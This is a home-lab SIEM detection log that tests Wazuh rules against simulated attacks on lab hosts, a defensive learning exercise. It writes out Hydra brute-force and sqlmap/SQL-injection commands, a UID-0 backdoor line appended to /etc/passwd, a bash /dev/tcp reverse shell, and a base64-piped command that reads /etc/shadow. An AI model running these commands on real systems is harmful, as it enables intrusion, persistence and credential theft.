# Detection Log: SIEM Home Lab

## Overview

This document records the security detection scenarios tested in the Wazuh SIEM home lab. Each entry captures the attack simulation methodology, detection results, analysis performed, and lessons learned. All detections are mapped to the MITRE ATT&CK framework.

---

## Detection Scenario 1: SSH Brute Force Attack

| Field | Detail |
|---|---|
| **Date** | 2025-03-03 |
| **Time** | 14:15 - 14:28 UTC |
| **MITRE ATT&CK** | T1110.001 - Brute Force: Password Guessing |
| **Target** | kali-endpoint (10.0.0.20), TCP/22 (SSH) |
| **Rules Triggered** | 100001, 100002, 100003, 100004 |
| **Severity** | Level 5 -> 10 -> 12 -> 14 (escalating) |

### Attack Simulation

Used Hydra from a separate terminal session on the Kali host (simulating an external attacker targeting the SSH service):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.20 -t 4 -V -f
```

Additionally ran a manual loop to generate a controlled number of failures:

```bash
for i in $(seq 1 25); do
  sshpass -p "wrongpassword" ssh -o StrictHostKeyChecking=no root@10.0.0.20 2>/dev/null
  echo "Attempt $i completed"
done
```

### Detection Results

| Time (UTC) | Rule ID | Level | Description |
|---|---|---|---|
| 14:15:03 | 100001 | 5 | SSH: Failed authentication attempt detected |
| 14:15:04 | 100001 | 5 | SSH: Failed authentication attempt detected |
| 14:15:05 | 100001 | 5 | SSH: Failed authentication attempt detected |
| 14:15:06 | 100001 | 5 | SSH: Failed authentication attempt detected |
| 14:15:07 | 100002 | 10 | SSH brute force: 5+ failed attempts from same source in 60s |
| 14:15:12 | 100003 | 12 | SSH brute force ESCALATION: 10+ failed attempts in 60s |
| 14:15:23 | 100004 | 14 | SSH brute force CRITICAL: 20+ failed attempts in 120s |

### Active Response Verification

After rule 100003 fired, the Wazuh active response module executed `firewall-drop`, adding an iptables rule to block the source IP for 600 seconds:

```bash
$ sudo iptables -L INPUT -n | grep DROP
DROP    all  --  10.0.0.20    0.0.0.0/0
```

The active response log confirmed execution:

```
Mon Mar  3 14:15:12 UTC 2025 /var/ossec/active-response/bin/firewall-drop add - 10.0.0.20 100003 14
```

### Analysis

- The escalating severity rules functioned correctly, providing increasing urgency as the attack volume increased.
- Rule 100001 (level 5) generated individual alerts that served as the correlation base.
- Rule 100002 (level 10) fired 4 seconds after the first failure, detecting the pattern within the expected timeframe.
- Active response blocked the source after rule 100003, effectively stopping the attack.
- No successful authentication was observed -- rule 100005 did not fire.

### Lessons Learned

- The `timeframe` parameter in frequency-based rules is critical. Setting it too high (e.g., 300 seconds) would catch legitimate users who mistype passwords over several minutes. The 60-second window was appropriate for distinguishing automated attacks from human error.
- The active response trigger should be tied to the level 12 rule (100003), not the level 10 rule (100002), to avoid blocking users who make a few rapid mistakes.
- Rate of Hydra with `-t 4` was approximately 4 attempts/second, consistent with expected tool behavior.

---

## Detection Scenario 2: SQL Injection Against Web Application

| Field | Detail |
|---|---|
| **Date** | 2025-03-04 |
| **Time** | 10:30 - 10:45 UTC |
| **MITRE ATT&CK** | T1190 - Exploit Public-Facing Application |
| **Target** | kali-endpoint (10.0.0.20), TCP/80 (Apache) |
| **Rules Triggered** | 100100, 100101, 100103, 100105 |
| **Severity** | Level 10 -> 12 (escalating via correlation) |

### Attack Simulation

Sent crafted HTTP requests to Apache on the Kali endpoint using curl:

```bash
# UNION-based SQLi
curl "http://10.0.0.20/index.html?id=1'+UNION+SELECT+username,password+FROM+users--"

# Boolean-based SQLi
curl "http://10.0.0.20/index.html?id=1'+OR+1=1--"

# Time-based blind SQLi
curl "http://10.0.0.20/index.html?id=1'+AND+SLEEP(5)--"

# Automated scan with sqlmap (limited to 10 requests for controlled testing)
sqlmap -u "http://10.0.0.20/index.html?id=1" --batch --level=1 --risk=1 --threads=1
```

### Detection Results

| Time (UTC) | Rule ID | Level | Description | HTTP Status |
|---|---|---|---|---|
| 10:30:14 | 100100 | 10 | SQL injection (UNION SELECT) | 404 |
| 10:30:22 | 100101 | 10 | SQL injection (boolean-based) | 404 |
| 10:30:35 | 100103 | 10 | SQL injection (time-based blind) | 404 |
| 10:31:02 | 100100 | 10 | SQL injection (UNION SELECT) - sqlmap | 404 |
| 10:31:03 | 100101 | 10 | SQL injection (boolean-based) - sqlmap | 404 |
| 10:31:04 | 100105 | 12 | Multiple SQLi attempts from same source in 60s | - |

### Analysis

- All four injection techniques were detected by the corresponding custom rules.
- The Apache server returned HTTP 404 for all payloads because the static `index.html` page does not have a dynamic backend. In a real scenario with a PHP/Python application, these payloads could have reached the database layer.
- The correlation rule 100105 correctly identified the automated scanning pattern when sqlmap sent multiple payloads within the 60-second window.
- The User-Agent header from sqlmap (`sqlmap/1.7.x`) was visible in the raw log data, providing an additional indicator for triage.

### Lessons Learned

- HTTP response codes are a critical triage factor. A 404 response to a SQLi payload is far less concerning than a 200 or 500, which would indicate the payload reached the application layer.
- The rules match on the URL field, which means POST-body payloads would not be detected by these rules. In a production environment, additional rules matching on the request body (via ModSecurity or a WAF integration) would be necessary.
- sqlmap's `--random-agent` flag changes the User-Agent, making it harder to identify the tool. Detection should not rely solely on User-Agent analysis.

---

## Detection Scenario 3: Unauthorized File Modification (/etc/passwd)

| Field | Detail |
|---|---|
| **Date** | 2025-03-04 |
| **Time** | 15:42 - 15:58 UTC |
| **MITRE ATT&CK** | T1565.001 - Data Manipulation: Stored Data Manipulation |
| **Target** | kali-endpoint (10.0.0.20), /etc/passwd, /var/www/html/index.html |
| **Rules Triggered** | Syscheck rules 550, 553, 554 |
| **Severity** | Level 7 (syscheck alert) |

### Attack Simulation

Simulated two file modification scenarios:

**Scenario A: Adding a backdoor user to /etc/passwd**
```bash
# Add a user with UID 0 (root-equivalent) -- a common persistence technique
echo "backdoor:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
```

**Scenario B: Web application defacement**
```bash
# Modify the web server index page (simulating defacement)
echo "<h1>HACKED BY SIMULATED THREAT ACTOR</h1>" | sudo tee /var/www/html/index.html
```

### Detection Results

| Time (UTC) | Rule | Level | File | Change Type |
|---|---|---|---|---|
| 15:42:18 | 554 (syscheck) | 7 | /etc/passwd | Modified |
| 15:42:18 | 550 (syscheck) | 7 | /var/www/html/index.html | Modified |

### Syscheck Alert Details (/etc/passwd)

The Wazuh dashboard displayed the following FIM alert data:

```
File: /etc/passwd
Event: Modified
Changed attributes: size, mtime, md5, sha1, sha256
Size before: 1842 -> Size after: 1889
SHA256 before: a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
SHA256 after:  f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1
User: root
Process: tee

Diff:
< (end of original file)
> backdoor:x:0:0::/root:/bin/bash
```

### Analysis

- The real-time FIM (syscheck with `realtime="yes"`) detected the modification within seconds of the change, not waiting for the next scheduled scan.
- The `report_changes="yes"` option provided the actual diff content, showing exactly what was added. This is critical for triage -- seeing `UID 0` in the new entry immediately identifies this as a privilege escalation / persistence attempt.
- The hash change (SHA-256) provides cryptographic proof of modification.
- The User field (`root`) and process (`tee`) attribute the change, which aids in determining whether the modification was authorized.

### Lessons Learned

- FIM diff output is invaluable during triage. Without it, the analyst would only know the file changed but not what changed, requiring manual investigation on the endpoint.
- Monitoring `/etc/passwd` for UID 0 entries is a well-known detection strategy, but it requires real-time monitoring to be effective. A 24-hour scan interval would miss an attacker who adds and then removes a backdoor account.
- The `/var/www/html` modification was also detected instantly, which would be critical for detecting web shell deployment (e.g., a PHP reverse shell uploaded via a file upload vulnerability).

---

## Detection Scenario 4: Suspicious Process Execution (Reverse Shell)

| Field | Detail |
|---|---|
| **Date** | 2025-03-05 |
| **Time** | 11:05 - 11:20 UTC |
| **MITRE ATT&CK** | T1059.004 - Command and Scripting Interpreter: Unix Shell |
| **Target** | kali-endpoint (10.0.0.20) |
| **Rules Triggered** | Wazuh rule 5104 (command monitoring), auditd rules |
| **Severity** | Level 8-10 |

### Attack Simulation

Simulated post-exploitation activity by executing commands that an attacker would typically run after gaining initial access:

**Scenario A: Netcat reverse shell (simulated, not connected)**
```bash
# Start a listener in one terminal (attacker side)
nc -lvnp 4444

# Execute reverse shell in another terminal (victim side, simulated)
bash -c 'bash -i >& /dev/tcp/10.0.0.50/4444 0>&1' &
```

**Scenario B: Base64-encoded command execution**
```bash
# Encode a command
echo "cat /etc/shadow" | base64
# Output: Y2F0IC9ldGMvc2hhZG93Cg==

# Execute the encoded command (common evasion technique)
echo "Y2F0IC9ldGMvc2hhZG93Cg==" | base64 -d | bash
```

**Scenario C: Reconnaissance commands**
```bash
whoami
id
uname -a
cat /etc/passwd
ss -tulnp
ps aux
```

### Detection Results

| Time (UTC) | Rule | Level | Description |
|---|---|---|---|
| 11:05:22 | 5104 | 8 | Anomalous command: bash -i >& /dev/tcp detected |
| 11:05:22 | auditd | 8 | SYSCALL execve: /bin/bash with network redirection |
| 11:08:15 | 5104 | 8 | Anomalous command: base64 -d piped to bash |
| 11:10:03 | - | - | ps aux command captured by command monitoring |
| 11:10:05 | - | - | ss -tulnp captured by listening-ports alias |

### Analysis

- The `full_command` log collection in ossec.conf (monitoring `ps aux` and `ss -tulnp` output) provided baseline data that was useful for identifying new or unexpected processes and listening ports.
- The bash reverse shell syntax (`/dev/tcp`) was captured by auditd's execve monitoring and correlated by Wazuh's command monitoring rules.
- The base64-encoded command pipeline (`base64 -d | bash`) was detected as an anomalous command pattern. This is a common technique attackers use to evade signature-based detection.
- The reconnaissance commands (`whoami`, `id`, `uname -a`) individually are benign, but their rapid sequential execution is a behavioral indicator of post-exploitation activity. Currently, no correlation rule ties these together -- this is a candidate for a future custom rule.

### Lessons Learned

- **auditd integration is essential** for detecting process-level activity. Without auditd logging execve syscalls, the reverse shell attempt would have been invisible to the SIEM (auth.log and syslog would not capture it).
- **Command monitoring via ossec.conf** (`full_command` log type) provides periodic snapshots but is not real-time. For continuous process monitoring, auditd with a properly configured audit.rules file is necessary.
- **Behavioral correlation is a gap.** Individual reconnaissance commands are not inherently malicious, but a burst of them from the same session should raise suspicion. A future custom rule could correlate 3+ reconnaissance commands from the same user within 30 seconds.
- **Encoded command execution** (`base64 -d | bash`) is a reliable high-fidelity indicator. There are very few legitimate reasons for this pattern outside of CI/CD pipelines, making it a strong detection candidate with low false positive risk.

---

## Summary of Detections

| Scenario | MITRE Technique | Rules | Detected | Active Response | Notes |
|---|---|---|---|---|---|
| SSH Brute Force | T1110.001 | 100001-100004 | Yes | Yes (firewall-drop) | Escalating severity worked as designed |
| SQL Injection | T1190 | 100100-100105 | Yes | No | Only URI-based; POST body is a gap |
| File Modification | T1565.001 | Syscheck | Yes | No | Real-time FIM with diff output |
| Reverse Shell | T1059.004 | 5104, auditd | Partial | No | Needs behavioral correlation rule |

## Future Improvements

1. **Write a correlation rule for post-exploitation reconnaissance** -- Detect sequential execution of `whoami`, `id`, `uname`, `cat /etc/passwd` within a short timeframe.
2. **Add POST body inspection** for web attack detection by integrating ModSecurity audit logs with Wazuh.
3. **Create a detection for new scheduled tasks** (cron persistence, T1053.003) with FIM on `/var/spool/cron` and `/etc/cron.d`.
4. **Integrate Suricata or Zeek** for network-level detection to complement host-based telemetry.
5. **Build a Sigma rule conversion pipeline** to translate community detection rules into Wazuh XML format.
